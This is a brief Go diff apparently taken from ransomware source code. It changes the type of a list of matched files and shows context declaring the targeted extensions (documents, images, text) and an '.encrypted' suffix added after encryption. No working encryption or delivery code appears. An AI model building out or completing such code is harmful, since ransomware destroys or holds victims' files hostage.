@@ -18,7 +18,7 @@ var (
 	InterestingExtensions = []string{"docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}
 
 	// Files to encrypt that match the extensions pattern
-	MatchedFiles []string
+	MatchedFiles []File
 
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
